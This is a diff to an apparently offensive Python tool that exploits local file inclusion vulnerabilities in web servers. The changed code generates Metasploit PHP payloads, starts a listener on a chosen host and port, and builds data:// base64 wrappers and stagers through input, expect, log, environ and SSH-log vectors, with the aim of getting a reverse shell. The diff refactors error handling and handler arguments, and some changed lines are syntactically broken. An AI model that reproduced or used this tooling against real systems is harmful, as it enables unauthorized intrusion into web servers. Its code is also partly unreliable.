@@ -72,12 +72,12 @@ def msf_payload():
         msf.wait()
         if msf.returncode != 0:
             print(t.red("[{0}] ".format(datetime.datetime.now())) + "Error Generating MSF Payload ")
-            msf_error = msf.returncode
+            sys.exit(1)
         else:
             print(t.red("[{0}] ".format(datetime.datetime.now())) + "Success! ")
             print(t.red("[{0}] ".format(datetime.datetime.now())) + "Payload: /tmp/{0}.php").format(shell)
-    except msf_error:
-        print(msf_error)
+    except OSError as os_error:
+        print(t.red("[{0}] ".format(datetime.datetime.now()))(os_error))
 
     return lhost, lport, shell
 
@@ -121,7 +121,7 @@ class Data:
         data_wrapper = "data://text/html;base64,{0}".format(encoded_payload)
         lfi = self.target + data_wrapper
 
-        handle = Payload(lhost, lport, self.target, shell)
+        handle = Payload(lhost, lport)
         handle.handler()
 
         if self.nostager:
@@ -192,7 +192,7 @@ class Input:
         else:
             payload = stager_payload.format(lhost, shell)
 
-        handle = Payload(lhost, lport, self.target, shell)
+        handle = Payload(lhost, lport)
         handle.handler()
 
         if self.nostager:
@@ -249,7 +249,7 @@ class Expect:
 
         lhost, lport, shell = msf_payload()
 
-        handle = Payload(lhost, lport, self.target, shell)
+        handle = Payload(lhost, lport)
         handle.handler()
 
         """ Build payload """
@@ -317,7 +317,7 @@ class Logs:
 
         lhost, lport, shell = msf_payload()
 
-        handle = Payload(lhost, lport, self.target, shell)
+        handle = Payload(lhost, lport)
         handle.handler()
 
         """ Handle staging """
@@ -411,7 +411,7 @@ class Environ:
 
         lhost, lport, shell = msf_payload()
 
-        handle = Payload(lhost, lport, self.target, shell)
+        handle = Payload(lhost, lport)
         handle.handler()
 
         """ Handle staging """
@@ -491,7 +491,6 @@ class Environ:
                                 sys.exit(1)
         except Exception as unknown_error:
             print t.red("[{0}] Unknown Error ".format(datetime.datetime.now()))(unknown_error)
-            http_p.kill()
             sys.exit(1)
 
 
@@ -510,7 +509,7 @@ class SSHLogs:
 
         lhost, lport, shell = msf_payload()
 
-        handle = Payload(lhost, lport, self.target, shell)
+        handle = Payload(lhost, lport)
         handle.handler()
 
         payload_file = open('/tmp/{0}.php'.format(shell), 'r')
